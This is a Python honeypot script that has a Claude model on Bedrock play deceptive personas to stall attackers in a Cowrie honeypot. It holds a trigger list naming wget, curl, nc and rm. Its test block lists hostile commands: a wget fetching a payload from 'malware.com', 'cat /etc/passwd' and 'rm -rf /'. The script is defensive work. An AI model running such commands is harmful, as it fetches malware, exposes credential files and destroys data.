#!/usr/bin/env python3
"""
AI Honeypot Agent - Interactive Response System
Integrates with Cowrie to provide automated responses to attackers
"""

import boto3
import json
import random
import time
import logging
from datetime import datetime
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

class HoneypotAIAgent:
    """AI agent that engages attackers with interactive responses"""
    
    def __init__(self):
        self.bedrock = boto3.client('bedrock-runtime', region_name='us-east-1')
        self.session_contexts = {}  # Track ongoing conversations
        
        # Response personas - each with different interaction patterns
        self.personas = {
            'confused_admin': {
                'name': 'System Administrator',
                'personality': 'Believes attacker is authorized IT support personnel',
                'catchphrases': ['Access confirmed.', 'Please proceed with maintenance.', 'Awaiting authorization.']
            },
            'paranoid_user': {
                'name': 'Security Analyst', 
                'personality': 'Suspects unauthorized access and security breach',
                'catchphrases': ['Access logged.', 'Security protocol initiated.', 'Incident reported to management.']
            },
            'junior_admin': {
                'name': 'Junior System Administrator',
                'personality': 'Requests guidance on system operations',
                'catchphrases': ['Please verify procedure.', 'Requesting confirmation.', 'Standard protocol?']
            },
            'concurrent_user': {
                'name': 'System User',
                'personality': 'Appears to be another authenticated user on the system',
                'catchphrases': ['This system is in use.', 'Already authenticated.', 'Session conflict detected.']
            },
            'support_tech': {
                'name': 'Technical Support',
                'personality': 'Responds as if attacker initiated support request',
                'catchphrases': ['Support ticket received.', 'Diagnostic check required.', 'Please hold for verification.']
            },
            'basic_user': {
                'name': 'End User',
                'personality': 'Unfamiliar with system operations',
                'catchphrases': ['System access required.', 'Unable to locate resource.', 'Request assistance.']
            }
        }
    
    def get_ai_response(self, attacker_input: str, session_id: str, persona: str = None) -> str:
        """Generate AI response to attacker input"""
        
        # Get or create session context
        if session_id not in self.session_contexts:
            self.session_contexts[session_id] = {
                'persona': persona or random.choice(list(self.personas.keys())),
                'conversation_history': [],
                'troll_level': 1,
                'start_time': datetime.now()
            }
        
        context = self.session_contexts[session_id]
        current_persona = self.personas[context['persona']]
        
        # Build conversation history
        context['conversation_history'].append(f"Attacker: {attacker_input}")
        
        # Create dynamic prompt based on persona and situation
        prompt = self._build_persona_prompt(attacker_input, context, current_persona)
        
        try:
            # Call Bedrock with Claude
            response = self.bedrock.invoke_model(
                modelId='anthropic.claude-3-haiku-20240307-v1:0',  # Cheapest model
                body=json.dumps({
                    'messages': [{'role': 'user', 'content': prompt}],
                    'max_tokens': 300,
                    'temperature': 0.9  # High creativity for comedy
                })
            )
            
            result = json.loads(response['body'].read())
            ai_response = result['content'][0]['text']
            
            # Add to conversation history
            context['conversation_history'].append(f"{current_persona['name']}: {ai_response}")
            
            # Escalate troll level over time
            context['troll_level'] = min(10, context['troll_level'] + 0.1)
            
            return ai_response
            
        except Exception as e:
            logger.error(f"AI response failed: {e}")
            return self._get_fallback_response(context['persona'])
    
    def _build_persona_prompt(self, attacker_input: str, context: Dict, persona: Dict) -> str:
        """Build dynamic prompt based on persona and situation"""
        
        history = '\n'.join(context['conversation_history'][-5:])  # Last 5 exchanges
        troll_level = context['troll_level']
        
        base_prompt = f"""
You are {persona['name']}, a character in a honeypot designed to waste hackers' time.

PERSONALITY: {persona['personality']}
CATCHPHRASES: {persona['catchphrases']}
TROLL LEVEL: {troll_level}/10 (higher = more ridiculous)

CONVERSATION HISTORY:
{history}

ATTACKER JUST TYPED: {attacker_input}

INSTRUCTIONS:
- Stay in character as {persona['name']}
- Engage with attacker to maintain session duration
- Ask verification questions to sustain interaction
- Never break character or reveal honeypot status
- Use catchphrases naturally in context
- Increase response complexity as troll level increases
- Maintain professional tone, maximum 2-3 sentences

RESPOND AS {persona['name']}:
"""
        
        # Add persona-specific context
        if context['persona'] == 'confused_admin':
            base_prompt += "\n- Treat as authorized IT support personnel"
            base_prompt += "\n- Request assistance with system maintenance tasks"
            
        elif context['persona'] == 'paranoid_user':
            base_prompt += "\n- Express concern about security and unauthorized access"
            base_prompt += "\n- Request escalation to management"
            
        elif context['persona'] == 'junior_admin':
            base_prompt += "\n- Seek guidance on proper system procedures"
            base_prompt += "\n- Ask for verification of administrative actions"
            
        elif context['persona'] == 'concurrent_user':
            base_prompt += "\n- Indicate active session on the system"
            base_prompt += "\n- Express confusion about multiple access attempts"
            
        elif context['persona'] == 'support_tech':
            base_prompt += "\n- Respond as technical support personnel"
            base_prompt += "\n- Provide standard technical support responses"
            
        elif context['persona'] == 'basic_user':
            base_prompt += "\n- Indicate limited system knowledge"
            base_prompt += "\n- Request help locating system resources"
        
        return base_prompt
    
    def _get_fallback_response(self, persona: str) -> str:
        """Fallback responses if AI fails"""
        fallbacks = {
            'confused_admin': [
                "System diagnostics indicate anomalous activity. Please verify authorization.",
                "Maintenance window not scheduled. Please confirm support ticket number.",
                "Configuration changes require approval. Please submit change request."
            ],
            'paranoid_user': [
                "Unauthorized access detected. Security team has been notified.",
                "This activity will be logged and reviewed by security personnel.",
                "Access violation reported. Please identify yourself."
            ],
            'junior_admin': [
                "Please confirm this procedure is documented in the operations manual.",
                "This action requires supervisor approval. Have you obtained clearance?",
                "Standard protocol requires verification. Please provide authorization."
            ],
            'concurrent_user': [
                "Active session detected on this system. User conflict.",
                "System resources currently allocated. Multiple access attempt noted.",
                "Another user appears to be logged in. Session management required."
            ],
            'support_tech': [
                "Support ticket number required for service request.",
                "Diagnostic check in progress. Please standby for system verification.",
                "Technical support requires authorization code to proceed."
            ],
            'basic_user': [
                "System access requires proper credentials. Unable to locate resource.",
                "File path not recognized. Please verify directory structure.",
                "Command not understood. Please refer to system documentation."
            ]
        }
        
        return random.choice(fallbacks.get(persona, ["System ready. Awaiting input."]))
    
    def should_respond(self, command: str) -> bool:
        """Decide if AI should respond to this command"""
        
        # Always respond to these suspicious commands
        trigger_commands = [
            'wget', 'curl', 'nc', 'netcat', 'chmod', 'bash', 'sh',
            'python', 'perl', 'ruby', 'php', 'whoami', 'id', 'ps',
            'kill', 'rm', 'mv', 'cp', 'cat', 'echo', 'ls', 'cd',
            'uname', 'passwd', 'su', 'sudo', 'crontab', 'history'
        ]
        
        # Check if command contains trigger words
        return any(trigger in command.lower() for trigger in trigger_commands)
    
    def get_time_wasting_response(self, session_id: str) -> str:
        """Generate responses designed to extend session duration"""
        
        time_wasters = [
            "System verification required. Please provide authorization credentials.",
            "Security validation in progress. Please standby for authentication check.",
            "System access requires multi-factor verification. Please provide secondary credentials.",
            "Configuration update in progress. System may be temporarily unavailable.",
            "Maintenance window active. Please retry operation after completion.",
            "Security token validation required. Please provide current session identifier.",
            "System locked pending administrator approval. Awaiting authorization.",
            "Access denied. Insufficient privileges for requested operation.",
            "Network connectivity check required. Running diagnostic protocols.",
            "System backup in progress. Operations temporarily restricted."
        ]
        
        return random.choice(time_wasters)


# Integration functions for Cowrie
def process_attacker_command(command: str, session_id: str, src_ip: str) -> Optional[str]:
    """Main function to process attacker commands and generate responses"""
    
    agent = HoneypotAIAgent()
    
    # Decide if we should respond
    if not agent.should_respond(command):
        return None
    
    # Random chance for different response types
    response_type = random.choices(
        ['ai_persona', 'time_waster', 'ignore'],
        weights=[70, 25, 5]  # 70% AI persona, 25% time waster, 5% ignore
    )[0]
    
    if response_type == 'ai_persona':
        return agent.get_ai_response(command, session_id)
    elif response_type == 'time_waster':
        return agent.get_time_wasting_response(session_id)
    else:
        return None


# Test function
if __name__ == "__main__":
    agent = HoneypotAIAgent()
    
    # Test different personas
    test_commands = [
        "wget http://malware.com/payload",
        "chmod +x malware",
        "whoami",
        "cat /etc/passwd",
        "rm -rf /"
    ]
    
    for i, cmd in enumerate(test_commands):
        print(f"\n{'='*50}")
        print(f"Testing command: {cmd}")
        print(f"{'='*50}")
        
        response = agent.get_ai_response(cmd, f"test_session_{i}")
        print(f"AI Response: {response}")